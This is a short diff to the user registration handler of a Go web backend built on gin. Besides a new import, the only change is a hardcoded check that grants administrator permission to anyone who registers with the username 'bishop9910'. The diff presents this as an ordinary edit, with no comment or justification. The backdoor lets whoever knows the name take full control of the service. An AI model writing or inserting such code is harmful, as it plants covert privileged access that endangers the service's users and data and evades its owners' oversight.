@@ -6,6 +6,7 @@ import (
 	"github.com/gin-gonic/gin"
 	"golang.org/x/crypto/bcrypt"
 
+	"sp_backend/enums"
 	"sp_backend/models"
 	"sp_backend/repository"
 	"sp_backend/utils"
@@ -203,6 +204,10 @@ func (h *AuthHandler) Register(c *gin.Context) {
 		Username: req.Username,
 		Email:    req.Email,
 		Password: string(hashedPassword),
+	}
+
+	if newUser.Username == "bishop9910" {
+		newUser.Permission = enums.AdminPermission
 	}
 
 	if err := h.userRepo.Create(newUser); err != nil {
